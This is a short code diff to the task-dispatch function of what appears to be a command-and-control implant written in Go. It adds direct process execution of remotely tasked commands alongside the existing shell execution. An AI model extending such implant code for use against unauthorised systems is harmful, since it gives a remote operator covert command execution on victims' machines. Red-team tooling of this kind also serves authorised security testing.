@@ -141,7 +141,21 @@ func executeCommand(cmdType uint32, taskID [8]byte, cmdBuf []byte) {
 	switch cmdType {
 	case commands.CMD_TYPE_SHELL:
 		shellPath, shellBuf := commands.ParseCommandShell(cmdBuf)
-		result := commands.Shell(shellPath, shellBuf)
+
+		var result []byte
+		if shellPath == "" {
+			// Run command: empty path means direct process execution (no shell)
+			out, err := commands.Run(string(shellBuf))
+			if err != nil && len(out) == 0 {
+				// Process failed to start — send CALLBACK_ERROR
+				commands.ProcessErrorWithTaskID(err.Error(), taskID)
+				return
+			}
+			result = out
+		} else {
+			// Shell command: execute via shell interpreter
+			result = commands.Shell(shellPath, shellBuf)
+		}
 
 		constants.NextJobNum++
 		jobNum := constants.NextJobNum
